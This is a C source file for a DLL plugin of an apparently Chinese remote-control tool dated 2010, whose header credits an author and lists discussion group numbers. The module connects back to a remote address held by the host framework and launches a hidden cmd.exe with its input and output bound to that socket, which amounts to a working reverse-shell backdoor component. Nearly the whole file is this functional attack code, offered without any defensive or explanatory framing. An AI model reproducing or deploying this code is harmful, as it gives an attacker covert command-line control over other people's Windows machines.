/*
开发作者:可明
开发日期:2010.8
远程控制编程讨论群:30660169,6467438
*/

#include "../kms/km_head.h"
#include <stdio.h>

pshare_main g_share_main = NULL;

unsigned __stdcall
cmd_work(void *param)
{
    pio_socket i_socket = (pio_socket)param;

    STARTUPINFO startinfo;
    PROCESS_INFORMATION ProcessInformation;

    memset(&startinfo,0x0,sizeof(STARTUPINFO));
    memset(&ProcessInformation,0x0,sizeof(PROCESS_INFORMATION));

    startinfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    startinfo.wShowWindow = SW_HIDE;
    startinfo.hStdInput   = startinfo.hStdOutput = startinfo.hStdError = (void*)i_socket->socket;

    if(k_CreateProcess(NULL,"cmd",NULL,NULL,1,0,NULL,NULL,&startinfo,&ProcessInformation)){
        k_WaitForSingleObject(ProcessInformation.hProcess,INFINITE);
        k_CloseHandle(ProcessInformation.hProcess);
        k_CloseHandle(ProcessInformation.hThread);
    }

    k_sock_close(i_socket);
    return 0;
}

int
km_cmd_connect(int ret, DWORD dwTrans, pio_socket i_socket, LPOVERLAPPED lpoverlapped)
{
    printf("%s\n", "km_cmd_connect");
    if (ret) {
        k_CloseHandle((HANDLE)k_beginthreadex(NULL,0,cmd_work,(void*)i_socket,0,NULL));
        return 10;
    }
    return SOCK_LOOP_RE_COUNT;
}

int
kms_main_cmd(pio_socket i_socket, char *buffer, int length)
{
    pio_data_header pi_data_header = (pio_data_header)buffer;
    printf("%s\n", "kms_main_cmd");

    if (!k_sock_ret_connect(g_share_main->remote_addr, pi_data_header->crc32, km_cmd_connect)) {
        printf("%s\n", "k_sock_ret_connect error");
    }
    return SOCK_LOOP_RECV_HEADER;
}

kms_event_func event_funcs[] = {
    kms_main_cmd,
};

int __declspec(dllexport) initialize(pshare_main ps_main)
{
    g_share_main = ps_main;
    g_share_main->event_funcs[2].event_funcs = event_funcs;
    g_share_main->event_funcs[2].count = 1;
    return 0;
}
